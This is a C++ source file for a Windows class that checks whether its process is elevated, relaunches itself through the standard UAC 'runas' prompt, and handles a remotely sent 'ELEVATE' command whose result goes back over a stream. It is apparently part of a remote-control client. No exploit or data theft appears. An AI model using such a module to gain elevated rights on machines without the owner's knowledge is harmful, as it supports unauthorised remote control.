#include "Permission.h"

BOOL Permission::hasAdminPermission() {
    BOOL fRet = FALSE;
    HANDLE hToken = nullptr;
    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof( TOKEN_ELEVATION );
        if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) {
            fRet = (BOOL) Elevation.TokenIsElevated;
        }
    }
    if( hToken ) {
        CloseHandle( hToken );
    }
    return fRet;
}

BOOL Permission::elevatePermissions() {
    if (hasAdminPermission() == 0) {
        char szPath[MAX_PATH];
        if (GetModuleFileName(nullptr, szPath, ARRAYSIZE(szPath))) {
            SHELLEXECUTEINFO sei = {sizeof(sei)};
            sei.lpVerb = "runas";
            sei.lpFile = szPath;
            sei.hwnd = nullptr;
            sei.nShow = SW_NORMAL;
            return ShellExecuteEx(&sei);
        }
    }
    return 2;
}

void Permission::sendElevatedPermissions() {
    BOOL result = elevatePermissions();
    if (result == 1) {
        stream.sendSize(1);
        exit(0);
    }
    stream.sendSize(result);
}

Permission::Permission(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap) : Sender(stream, actionMap) {
    actionMap["ELEVATE"] = [&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &Permission::sendElevatedPermissions);
    };

}

void Permission::send() {

}

